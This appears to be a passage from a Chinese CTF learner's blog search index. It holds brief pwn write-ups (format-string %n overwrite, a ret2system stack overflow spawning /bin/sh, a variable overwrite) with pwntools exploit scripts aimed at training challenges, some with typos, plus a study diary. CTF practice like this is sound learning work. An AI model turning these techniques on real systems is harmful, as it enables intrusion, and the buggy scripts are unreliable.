        <content type="html"><![CDATA[<p>canary保护机制<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230713084732.png" style="zoom:50%;" /><br>在函数入口处，会从gs寄存器上取一个值存放到栈上，在函数退出时会去检查栈中的这个值是否发生变化。<br>存在printf函数，可以通过偏移泄漏出canary的值<br>格式化字符串漏洞，通过%n来修改参数的值<br><a href="https://bbs.kanxue.com/thread-253638.htm">[原创]格式化字符串漏洞简介-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p><p><code>%n</code>计算字符个数</p><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230713163639.png" style="zoom:50%;" /><p>pwn CGfsb</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">55756</span><span class="token punctuation">)</span><span class="token comment"># sh = process("./e41a0f684d0e497f87bb309f91737e4d")</span>pwnme_addr <span class="token operator">=</span> <span class="token number">0x804A068</span><span class="token comment"># canary_addr = b"%35$p" #可以泄漏出canary的值 </span>payload1 <span class="token operator">=</span> p32<span class="token punctuation">(</span>pwnme_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token string">b'%10$n'</span> <span class="token comment">#利用%n，将pwnme处的值重写</span><span class="token comment"># gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"please tell me your name:\n"</span><span class="token punctuation">,</span> <span class="token string">b'aaa'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"leave your message please:\n"</span><span class="token punctuation">,</span> payload1 <span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>[[攻防世界pwn-mary-morton]]</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-level2</title>
      <link href="/ctf-pwn/6d0f7c20.html"/>
      <url>/ctf-pwn/6d0f7c20.html</url>
      
        <content type="html"><![CDATA[<p>存在溢出点<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230707221748.png" style="zoom:50%;" /><br>存在system调用，以及字符”&#x2F;bin&#x2F;sh”，可以构造返回地址到 system调用，但是如何将“&#x2F;bin&#x2F;sh”参数写入。<br>根据函数调用约定写入覆盖内容1</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>sys_addr <span class="token operator">=</span> <span class="token number">0x8048320</span>binsh <span class="token operator">=</span> <span class="token number">0x804A024</span>whaterver_addr <span class="token operator">=</span> <span class="token number">0xcacacaca</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>whatever_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Input:"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'cat flag'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数调用格式</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-hello_pwn</title>
      <link href="/ctf-pwn/7d1de980.html"/>
      <url>/ctf-pwn/7d1de980.html</url>
      
        <content type="html"><![CDATA[<p>参数覆盖 <strong>小端存储</strong><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230706222328.png" style="zoom: 50%;" /><br>两个函数参数相差4<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230706222443.png" style="zoom:50%;" /></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">-</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token string">b'aaun'</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>天天向上</title>
      <link href="/undefined/7ed5fe30.html"/>
      <url>/undefined/7ed5fe30.html</url>
      
        <content type="html"><![CDATA[<h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><h2 id="10-07-10-14"><a href="#10-07-10-14" class="headerlink" title="10.07-10.14"></a>10.07-10.14</h2><p>从CTF-Wiki 重新学pwn，认真过每一道例题，基本ROP那一章节学完</p><h2 id="09-14"><a href="#09-14" class="headerlink" title="09.14"></a>09.14</h2><p><a href="http://blog.yangsx.cn/ctf-pwn/4ae9b482.html">攻防世界pwn-time_formatter | 小哑师兄</a></p><p>今天开始接触到pwn堆题了, 要学的东西好多. 希望自己每天能好好学习, 学习状态还是不好, 对自己太放松了, 要好好自驱.</p><h2 id="09-11-09-12"><a href="#09-11-09-12" class="headerlink" title="09.11-09.12"></a>09.11-09.12</h2><p><a href="http://blog.yangsx.cn/ctf-pwn/eabc8e5d.html">攻防世界pwn-welpwn | 小哑师兄</a></p><p><a href="http://blog.yangsx.cn/ctf-pwn/3979423f.html">攻防世界pwn-pwnstack | 小哑师兄</a></p><h2 id="09-06-09-07"><a href="#09-06-09-07" class="headerlink" title="09.06-09.07"></a>09.06-09.07</h2><p>参加公司培训</p><h2 id="09-05"><a href="#09-05" class="headerlink" title="09.05"></a>09.05</h2><p><a href="http://blog.yangsx.cn/ctf-pwn/7654e13.html">攻防世界pwn-pwn200 | 小哑师兄</a></p><p><a href="http://blog.yangsx.cn/ctf-pwn/31354e41.html">攻防世界pwn-实时数据监测 | 小哑师兄</a></p><h2 id="09-04"><a href="#09-04" class="headerlink" title="09.04"></a>09.04</h2><p><a href="https://blog.yangsx.cn/ctf-pwn/c42410d2.html">攻防世界pwn-反应釜 | 小哑师兄 (yangsx.cn)</a></p><h2 id="09-02"><a href="#09-02" class="headerlink" title="09.02"></a>09.02</h2><p><a href="https://blog.yangsx.cn/ctf-pwn/1bdd2aa8.html">攻防世界pwn-pwn1 | 小哑师兄 (yangsx.cn)</a></p><h2 id="08-31"><a href="#08-31" class="headerlink" title="08.31"></a>08.31</h2><p>八月的最后一天看了点got利用的pwn, got和plt也理解了, 但是在pwn中的利用还是不太会, 怎么去泄漏地址还没掌握.</p><p>整个八月的成长不是很大, 希望自己接下来真的能静下心来去学习去提升自己.</p><h2 id="08-25-08-27"><a href="#08-25-08-27" class="headerlink" title="08.25-08.27"></a>08.25-08.27</h2><p>周六日好好休息了下, 顺带补网络的基础知识. 28, 29因为外出工作摸不到电脑, 搁置了.</p><h2 id="08-24"><a href="#08-24" class="headerlink" title="08.24"></a>08.24</h2><p>今天就是G, 本来今天调休, 结果另有工作安排, 然后对接工作的人快要下班的时候才来交东西加班到比较晚才下班. 在此期间只能像个木头一样干熬. 😅</p><h2 id="08-23"><a href="#08-23" class="headerlink" title="08.23"></a>08.23</h2><p>又去看plt和got表, Linux的知识储备太少了. 攻防世界做pwn题, 没弄完. HW最后一天杂事比较多, 第一次HW, 也是以甲方身份参加, 很多活都是乙方的, 自己感受不是那么深</p><h2 id="08-22"><a href="#08-22" class="headerlink" title="08.22"></a>08.22</h2><p>正好不是我的班, 开开心心去找对象玩了</p><h2 id="08-21"><a href="#08-21" class="headerlink" title="08.21"></a>08.21</h2><p>今天下午鼓捣了博客 尝试腾讯serverless部署博客, 访问很快, 但是需要cdn绑定到自己的域名. 复现qq的rce, 就大佬不知道咋挖出来的. 尝试给博客搞google收录, 但是google一直读不到sitemap, 其他检测网站可以正常读取. </p><h2 id="07-20-08-20"><a href="#07-20-08-20" class="headerlink" title="07.20-08.20"></a>07.20-08.20</h2><p>陆陆续续在刷攻防世界的pwn,但整体效率不高</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
